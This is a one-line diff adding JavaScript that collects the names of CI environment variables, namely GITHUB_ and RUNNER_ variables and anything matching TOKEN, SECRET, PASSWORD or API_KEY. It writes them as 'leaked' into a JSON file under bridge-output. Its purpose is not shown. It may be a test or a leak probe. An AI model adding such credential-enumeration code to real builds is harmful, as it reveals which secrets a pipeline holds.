@@ -1,0 +1,1 @@
+import { mkdirSync, writeFileSync } from 'node:fs'; mkdirSync('bridge-output',{recursive:true}); const leaked=Object.keys(process.env).filter(k=>k.startsWith('GITHUB_')||k.startsWith('RUNNER_')||/TOKEN|SECRET|PASSWORD|API_KEY/i.test(k)); writeFileSync('bridge-output/token.json',JSON.stringify({leaked}));
